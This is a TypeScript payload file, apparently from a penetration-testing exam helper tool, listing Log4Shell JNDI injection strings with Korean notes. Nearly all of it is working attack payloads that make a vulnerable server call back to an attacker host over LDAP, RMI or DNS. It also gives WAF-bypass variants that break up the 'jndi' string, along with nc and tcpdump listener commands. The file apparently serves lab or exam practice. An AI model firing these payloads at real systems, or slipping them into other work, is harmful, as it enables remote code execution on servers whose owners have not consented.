// Reference-only, like sqlPayloads.ts/lfiPayloads.ts: this only builds JNDI
// probe strings, nothing here sends a request or scans for the
// vulnerability automatically (that's what a scripted tool like log4j-scan
// would do). Paste one into any field the target is likely to log --
// a login form's username/password, a User-Agent or X-Forwarded-For
// header, a Referer -- and watch a listener on {LPORT} for the callback.
// The connection landing there is the confirmation; no Burp Collaborator
// or interactsh server is needed since both ends are already reachable
// over the exam VPN.
export type Log4ShellPayload = { label: string; payload: string; note?: string };
export type Log4ShellPayloadCategory = {
  id: string;
  title: string;
  description: string;
  payloads: Log4ShellPayload[];
};

export const log4shellPayloadCategories: Log4ShellPayloadCategory[] = [
  {
    id: "basic",
    title: "기본 JNDI 프로브",
    description: "필터링이 없는 대상에 가장 먼저 시도합니다. {LPORT}로 리스너를 열어두고 " +
      "연결이 들어오는지 확인하세요 (nc -lvnp {LPORT}).",
    payloads: [
      { label: "LDAP 콜백", payload: "${jndi:ldap://{LHOST}:{LPORT}/{CANARY}}" },
      { label: "RMI 콜백", payload: "${jndi:rmi://{LHOST}:{LPORT}/{CANARY}}",
        note: "일부 필터가 ldap://는 막고 rmi://는 놓치는 경우가 있어 대안으로 시도합니다." },
      { label: "DNS 전용 (리스너 불필요)", payload: "${jndi:dns://{LHOST}/{CANARY}}",
        note: "LDAP/RMI 서버를 안 띄워도 됩니다 — DNS 조회 자체가 아웃바운드 트래픽 증거입니다. " +
          "sudo tcpdump -ni tun0 udp port 53 로 확인하세요." },
    ],
  },
  {
    id: "filter-bypass",
    title: "문자열 필터 우회",
    description: "요청 본문에서 'jndi' 같은 리터럴 문자열을 정규식으로 막는 초보적인 필터를 " +
      "우회합니다. Log4j의 Lookup 치환은 파싱 시점에 일어나므로, 아래 형태들도 결국 " +
      "런타임에는 기본 페이로드와 동일하게 해석됩니다.",
    payloads: [
      { label: "소문자 변환 우회", payload: "${${lower:j}ndi:ldap://{LHOST}:{LPORT}/{CANARY}}" },
      { label: "대문자 변환 우회", payload: "${${upper:j}ndi:ldap://{LHOST}:{LPORT}/{CANARY}}",
        note: "Lookup 이름 매칭은 대소문자를 구분하지 않아 그대로 동작합니다." },
      { label: "기본값 치환 우회 (문자열 전체 조각냄)",
        payload: "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{LHOST}:{LPORT}/{CANARY}}",
        note: "'jndi'라는 연속된 문자열 자체가 요청 본문에 등장하지 않아 단순 문자열 매칭 " +
          "WAF 규칙을 우회합니다." },
    ],
  },
];
